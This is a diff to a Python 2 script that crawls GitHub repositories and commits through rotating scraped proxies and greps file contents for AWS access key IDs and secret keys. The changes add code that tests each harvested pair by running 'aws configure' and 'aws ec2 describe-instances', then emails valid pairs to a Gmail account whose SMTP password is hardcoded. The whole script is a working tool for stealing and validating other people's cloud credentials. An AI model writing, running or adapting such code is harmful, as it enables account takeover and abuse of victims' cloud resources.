@@ -2,8 +2,12 @@ import requests
 import json
 import re
 import smtplib
-
+import lxml.html as html
+import numpy
 import time
+import os
+from subprocess import *
+import subprocess
 from compiler.pycodegen import EXCEPT
 from multiprocessing.dummy import Pool as ThreadPool 
 bannedIps = []
@@ -36,103 +40,11 @@ def newpool(num):
     pool.join()  
         
     #getContrib(repos, shake)  
-def getBranches(url, shake):
+def getCommits(url, shake):
     import urllib2
     global bannedIps
     import json
     #print url
-    """page = requests.get('https://free-proxy-list.net/')
-    webpage = html.fromstring(page.content)
-    proxy = []
-    i = 0
-    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
-    ports = webpage.xpath("//tbody/tr/td[2]/text()")
-    secure = webpage.xpath("//td[7]/text()")
-    for proxyy in proxies:
-        if secure[i] == 'yes':
-            proxy.append((proxyy) + ":" + (ports[i]))
-        #print proxy[i]
-        i = i + 1
-    proxy.append('198.100.158.142:3128')
-    proxy.append('192.95.4.14:8080')
-    proxy.append('167.114.23.80:8080')
-    proxy.append('167.114.47.242:8080')
-    proxy.append('158.69.31.45:3128')
-    proxy.append('198.50.212.32:8799')
-    proxy.append('149.56.147.46:80')
-    proxy.append('144.217.31.225:3128')
-    page = requests.get('https://hidemy.name/en/proxy-list/?type=s')
-    webpage = html.fromstring(page.content)
-    i = 0
-    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
-    ports = webpage.xpath("//tbody/tr/td[2]/text()")
-    
-    for proxyy in proxies:
-        proxy.append((proxyy) + ":" + (ports[i]))
-        #print proxy[i]
-        i = i + 1
-    page = requests.get('https://www.socks-proxy.net/')
-    webpage = html.fromstring(page.content)
-    i = 0
-    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
-    ports = webpage.xpath("//tbody/tr/td[2]/text()")
-    secure = webpage.xpath("//td[7]/text()")
-    
-    for proxyy in proxies:
-        if secure[i] == 'yes':
-            proxy.append((proxyy) + ":" + (ports[i]))
-        #print proxy[i]
-        i = i + 1
-    from random import randint
-    from random import seed
-    import random
-    import uuid
-    rand = numpy.random.randint(0, len(proxy))
-    #print rand
-    #print proxy[rand]
-    """
-    done = False
-    while done == False:
-        #if 'https://' + proxy[rand] not in bannedIps:
-        proxyDict = { 
-                  #'https':'https://' + proxy[rand]
-                  'https':'https://168.235.64.108:8081'
-                }
-        done = True
-    #print proxyDict
-    try:
-        time.sleep(0.5)
-
-        #req = requests.get(url, proxies=proxyDict)
-        req = requests.get(url + "?" + shake, proxies=proxyDict, timeout = 40)
-        print url
-        json = json.loads(req.content)
-        for item in json:
-             print item['name']
-             try:
-                 f = open("logs.txt", "a+b")
-                 f.write(item['name'] + "\n")
-                 f.close()
-
-                 print item['name']
-                 getUrl(url[:-8]+ 'contents/?ref=' + item['name'], shake)
-             except Exception as e:
-                 f = open("logs.txt", "a+b")
-                 f.write('getBranch: ' + str(e) + ': ' + req.content +'\n')
-                 f.close()
-                 print 'getBranch: ' + str(e) + ': ' + req.content
-                 getBranches(url, shake)
-    except Exception as e:
-        print e
-        getBranches(url, shake)
-    #print req.content
-    
-def getUrl(url, shake):
-    import urllib2
-    global bannedIps
-    import json
-    #print url
-    """
     page = requests.get('https://free-proxy-list.net/')
     webpage = html.fromstring(page.content)
     proxy = []
@@ -145,19 +57,19 @@ def getUrl(url, shake):
             proxy.append((proxyy) + ":" + (ports[i]))
         #print proxy[i]
         i = i + 1
-    proxy.append('198.100.158.142:3128')
-    proxy.append('192.95.4.14:8080')
-    proxy.append('167.114.23.80:8080')
-    proxy.append('167.114.47.242:8080')
-    proxy.append('158.69.31.45:3128')
-    proxy.append('198.50.212.32:8799')
-    proxy.append('149.56.147.46:80')
-    proxy.append('144.217.31.225:3128')
+    #proxy.append('198.100.158.142:3128')
+    #proxy.append('192.95.4.14:8080')
+    #proxy.append('167.114.23.80:8080')
+    #proxy.append('167.114.47.242:8080')
+    #proxy.append('158.69.31.45:3128')
+    #proxy.append('198.50.212.32:8799')
+    #proxy.append('149.56.147.46:80')
+    #proxy.append('144.217.31.225:3128')
     page = requests.get('https://hidemy.name/en/proxy-list/?type=s')
     webpage = html.fromstring(page.content)
     i = 0
     proxies = webpage.xpath("//tbody/tr/td[1]/text()")
-    ports = webpage.xpatfh("//tbody/tr/td[2]/text()")
+    ports = webpage.xpath("//tbody/tr/td[2]/text()")
     
     for proxyy in proxies:
         proxy.append((proxyy) + ":" + (ports[i]))
@@ -182,16 +94,108 @@ def getUrl(url, shake):
     rand = numpy.random.randint(0, len(proxy))
     #print rand
     #print proxy[rand]
-    """
+   
     done = False
     while done == False:
-        #if 'https://' + proxy[rand] not in bannedIps:
-       proxyDict = { 
-                  #'https':'https://' + proxy[rand]
-                  'https':'https://168.235.64.108:8081'
+        if 'https://' + proxy[rand] not in bannedIps:
+        	proxyDict = { 
+                  'https':'https://' + proxy[rand]
+                  #'https':'https://168.235.64.108:8081'
+                }
+        done = True
+    print proxyDict
+    try:
+        time.sleep(0.5)
+
+        #req = requests.get(url, proxies=proxyDict)
+        req = requests.get(url + "?" + shake, proxies=proxyDict, timeout = 40)
+        print url
+        json = json.loads(req.content)
+        for item in json:
+             print item['sha']
+             try:
+                 f = open("logs.txt", "a+b")
+                 f.write(item['sha'] + "\n")
+                 f.close()
+
+                 print item['sha']
+                 getUrl(url[:-8] + '/contents/?ref=' + item['sha'], shake)
+             except Exception as e:
+                 f = open("logs.txt", "a+b")
+                 f.write('getBranch: ' + str(e) + ': ' + req.content +'\n')
+                 f.close()
+                 print 'getBranch: ' + str(e) + ': ' + req.content
+                 getCommits(url, shake)
+    except Exception as e:
+        print e
+        getCommits(url, shake)
+    #print req.content
+    
+def getUrl(url, shake):
+    import urllib2
+    global bannedIps
+    import json
+    #print url
+    
+    page = requests.get('https://free-proxy-list.net/')
+    webpage = html.fromstring(page.content)
+    proxy = []
+    i = 0
+    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
+    ports = webpage.xpath("//tbody/tr/td[2]/text()")
+    secure = webpage.xpath("//td[7]/text()")
+    for proxyy in proxies:
+        if secure[i] == 'yes':
+            proxy.append((proxyy) + ":" + (ports[i]))
+        #print proxy[i]
+        i = i + 1
+    #proxy.append('198.100.158.142:3128')
+    #proxy.append('192.95.4.14:8080')
+    #proxy.append('167.114.23.80:8080')
+    #proxy.append('167.114.47.242:8080')
+    #proxy.append('158.69.31.45:3128')
+    #proxy.append('198.50.212.32:8799')
+    #proxy.append('149.56.147.46:80')
+    #proxy.append('144.217.31.225:3128')
+    page = requests.get('https://hidemy.name/en/proxy-list/?type=s')
+    webpage = html.fromstring(page.content)
+    i = 0
+    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
+    ports = webpage.xpath("//tbody/tr/td[2]/text()")
+    
+    for proxyy in proxies:
+        proxy.append((proxyy) + ":" + (ports[i]))
+        #print proxy[i]
+        i = i + 1
+    page = requests.get('https://www.socks-proxy.net/')
+    webpage = html.fromstring(page.content)
+    i = 0
+    proxies = webpage.xpath("//tbody/tr/td[1]/text()")
+    ports = webpage.xpath("//tbody/tr/td[2]/text()")
+    secure = webpage.xpath("//td[7]/text()")
+    
+    for proxyy in proxies:
+        if secure[i] == 'yes':
+            proxy.append((proxyy) + ":" + (ports[i]))
+        #print proxy[i]
+        i = i + 1
+    from random import randint
+    from random import seed
+    import random
+    import uuid
+    rand = numpy.random.randint(0, len(proxy))
+    #print rand
+    #print proxy[rand]
+    
+    done = False
+    while done == False:
+       if 'https://' + proxy[rand] not in bannedIps:
+		proxyDict = { 
+                  'https':'https://' + proxy[rand]
+                  #'https':'https://168.235.64.108:8081'
                 }
        done = True
-    #print proxyDict
+    print proxyDict
     try:
         print url
         #req = requests.get(url, proxies=proxyDict)
@@ -202,6 +206,7 @@ def getUrl(url, shake):
         f.close()
         print url + "&" + shake
         json = json.loads(req.content)
+	print json
         for item in json:
             #time.sleep(.8)
             try:
@@ -232,27 +237,53 @@ def getUrl(url, shake):
                            key = re.search(r'(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])', content2)
                            if (key):
                                if (id):
-                                    msg = "\r\n".join([
-                                      "From: jarettrsdunn@gmail.com",
-                                      "To: jarettrsdunn@gmail.com",
-                                      "Subject: new match",
-                                      "",
-                                      "id: " + id.group() + "\nkey: " + key.group() + '\n\n'
-                                      ])
-                                    username = 'jarettrsdunn@gmail.com'
-                                    password = 'fooledyah'
-                                    server = smtplib.SMTP('smtp.gmail.com:587')
-                                    server.ehlo()
-                                    server.starttls()
-                                    fromaddr = "jarettrsdunn@gmail.com"
-                                    toaddrs = ["jarettrsdunn@gmail.com"]
-                                    server.login(username,password)
-                                    server.sendmail(fromaddr, toaddrs, msg)
-                                    server.quit()
-                                    f = open("output.txt", "a+b")
-                                    f.write("id: " + id.group() + "\nkey: " + key.group() + '\n\n')
-                                    f.close()
-                                    print "id: " + id.group() + "key: " + key.group()
+				    
+				    p = Popen( ["sh"], stdin=PIPE, stdout=PIPE )
+				    time.sleep(1)
+				    p.stdin.write("aws configure\n")
+				    time.sleep(4)
+				    p.stdin.write(id.group() + "\n")
+				    time.sleep(1)
+				    p.stdin.write(key.group() + "\n")
+				    time.sleep(1)
+				    p.stdin.write("\n")
+				    time.sleep(1)
+				    p.stdin.write("\n")
+				    time.sleep(1)
+				    def awsdescribe():
+
+				        p = subprocess.Popen(["aws", "ec2", "describe-instances"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				        output = p.stderr.read()
+				        return output
+
+				    out = awsdescribe()
+
+
+				    print out
+				    if 'AuthFailure' in out:
+				            print 'authfailure!'
+				    else:
+		                            msg = "\r\n".join([
+		                              "From: jarettrsdunn@gmail.com",
+		                              "To: jarettrsdunn@gmail.com",
+		                              "Subject: new match",
+		                              "",
+		                              "id: " + id.group() + "\nkey: " + key.group() + '\n\n'
+		                              ])
+		                            username = 'jarettrsdunn@gmail.com'
+		                            password = 'yarite'
+		                            server = smtplib.SMTP('smtp.gmail.com:587')
+		                            server.ehlo()
+		                            server.starttls()
+		                            fromaddr = "jarettrsdunn@gmail.com"
+		                            toaddrs = ["jarettrsdunn@gmail.com"]
+		                            server.login(username,password)
+		                            server.sendmail(fromaddr, toaddrs, msg)
+		                            server.quit()
+		                            f = open("output.txt", "a+b")
+		                            f.write("id: " + id.group() + "\nkey: " + key.group() + '\n\n')
+		                            f.close()
+		                            print "id: " + id.group() + "key: " + key.group()
             except Exception as e:
                  f = open("logs.txt", "a+b")
                  f.write('geturl: url=' + url + ' : ' + str(e) + ': ' + req.content + '\n')
@@ -284,7 +315,7 @@ def getContrib(url):
 
     import json
     #print url
-    """
+    
     page = requests.get('https://free-proxy-list.net/')
     webpage = html.fromstring(page.content)
     proxy = []
@@ -321,14 +352,14 @@ def getContrib(url):
             proxy.append((proxyy) + ":" + (ports[i]))
         #print proxy[i]
         i = i + 1
-    proxy.append('198.100.158.142:3128')
-    proxy.append('192.95.4.14:8080')
-    proxy.append('167.114.23.80:8080')
-    proxy.append('167.114.47.242:8080')
-    proxy.append('158.69.31.45:3128')
-    proxy.append('198.50.212.32:8799')
-    proxy.append('149.56.147.46:80')
-    proxy.append('144.217.31.225:3128')
+    #proxy.append('198.100.158.142:3128')
+    #proxy.append('192.95.4.14:8080')
+    #proxy.append('167.114.23.80:8080')
+    #proxy.append('167.114.47.242:8080')
+    #roxy.append('158.69.31.45:3128')
+    #proxy.append('198.50.212.32:8799')
+    #proxy.append('149.56.147.46:80')
+    #proxy.append('144.217.31.225:3128')
     
     from random import randint
     from random import seed
@@ -337,16 +368,16 @@ def getContrib(url):
     rand = numpy.random.randint(0, len(proxy))
     #print rand
     #print proxy[rand]
-    """
+    
     done = False
     while done == False:
-        #if 'https://' + proxy[rand] not in bannedIps:
-       proxyDict = { 
-                  #'https':'https://' + proxy[rand]
-                  'https':'https://168.235.64.108:8081'
+       if 'https://' + proxy[rand] not in bannedIps:
+		proxyDict = { 
+                  'https':'https://' + proxy[rand]
+                  #'https':'https://168.235.64.108:8081'
                 }
        done = True
-    #print proxyDict
+    print proxyDict
     try:
         print url
         #req = requests.get(url, proxies=proxyDict)
@@ -363,10 +394,12 @@ def getContrib(url):
         if first == True:
             #print item['id']
             first = False
+	commits = 'https://api.github.com/repos/' + json[0]['full_name'] + '/commits'
         branches = 'https://api.github.com/repos/' + json[0]['full_name'] + '/branches'
         
         #print contents
         id = json[0]['id']
+	found = False
         for line in open('ids.txt').readlines():
               found = False
               #print line
@@ -376,7 +409,7 @@ def getContrib(url):
                   break
         if not found:
                   
-            getBranches(branches, shake)
+            getCommits(commits, shake)
             f = open("ids.txt", "a+b")
             f.write(str(id) + "\n")
             f.close()
@@ -393,5 +426,7 @@ def getContrib(url):
     #print req.content
    
 
+import time
+print 'lala'
 
 newpool(25)              
